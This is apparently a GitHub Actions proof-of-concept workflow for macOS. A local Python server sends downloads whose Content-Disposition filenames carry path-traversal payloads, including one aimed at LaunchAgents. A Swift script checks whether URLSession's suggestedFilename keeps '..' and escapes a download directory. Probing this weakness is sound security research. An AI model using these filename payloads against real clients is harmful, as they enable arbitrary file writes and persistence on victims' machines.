name: PoC Real Server
on: workflow_dispatch
jobs:
  test:
    runs-on: macos-latest
    steps:
      - name: Test suggestedFilename with real HTTP server
        run: |
          cat > server.py << 'PYEOF'
          from http.server import BaseHTTPRequestHandler, HTTPServer
          import threading

          PAYLOADS = [
              ("../../../../../../tmp/pwned.txt", b"pwned-content"),
              ("../escape.bin", b"escape-content"),
              ("normal.zip", b"normal-content"),
              ("../../LaunchAgents/evil.plist", b"evil-content"),
              ('../"quoted".bin', b"quoted-content"),
          ]

          current = 0

          class H(BaseHTTPRequestHandler):
              def do_GET(self):
                  global current
                  if self.path == "/done":
                      self.send_response(200)
                      self.end_headers()
                      self.wfile.write(b"done")
                      threading.Thread(target=self.server.shutdown).start()
                      return
                  idx = min(current, len(PAYLOADS) - 1)
                  fname, body = PAYLOADS[idx]
                  current += 1
                  self.send_response(200)
                  self.send_header("Content-Type", "application/octet-stream")
                  self.send_header("Content-Disposition",
                      f'attachment; filename="{fname}"')
                  self.send_header("Content-Length", str(len(body)))
                  self.end_headers()
                  self.wfile.write(body)
              def log_message(self, *a): pass

          HTTPServer(("127.0.0.1", 9999), H).serve_forever()
          PYEOF

          python3 server.py &
          sleep 1

          cat > poc.swift << 'SWIFT'
          import Foundation

          let semaphore = DispatchSemaphore(value: 0)
          let payloads = [
              "../../../../../../tmp/pwned.txt",
              "../escape.bin",
              "normal.zip",
              "../../LaunchAgents/evil.plist",
              "../\"quoted\".bin"
          ]

          class Delegate: NSObject, URLSessionDownloadDelegate {
              let index: Int
              let input: String
              init(index: Int, input: String) {
                  self.index = index
                  self.input = input
              }
              func urlSession(_ s: URLSession, downloadTask: URLSessionDownloadTask,
                              didFinishDownloadingTo location: URL) {
                  let resp = downloadTask.response!
                  let name = resp.suggestedFilename ?? "nil"
                  let safe = (name as NSString).lastPathComponent

                  let baseDir = "/Users/test/Library/Caches/com.example/PersistentDownloads/UUID/App 1.0"
                  let joined = (baseDir as NSString).appendingPathComponent(name)

                  print("[\(self.index)] input: \(self.input)")
                  print("  suggestedFilename: \(name)")
                  print("  lastPathComponent: \(safe)")
                  print("  appendPathComponent: \(joined)")
                  print("  HAS_DOTDOT: \(name.contains(".."))")
                  print("  HAS_SLASH: \(name.contains("/"))")
                  print("  TRAVERSES: \(joined.contains(".."))")
                  print()
                  semaphore.signal()
              }
              func urlSession(_ s: URLSession, task: URLSessionTask,
                              didCompleteWithError error: Error?) {
                  if let e = error { print("  ERROR: \(e)"); semaphore.signal() }
              }
          }

          for (i, p) in payloads.enumerated() {
              let del = Delegate(index: i, input: p)
              let session = URLSession(configuration: .default,
                                       delegate: del, delegateQueue: nil)
              let url = URL(string: "http://127.0.0.1:9999/file\(i)")!
              session.downloadTask(with: url).resume()
              semaphore.wait()
          }

          let _ = try? Data(contentsOf: URL(string: "http://127.0.0.1:9999/done")!)
          SWIFT

          swift poc.swift
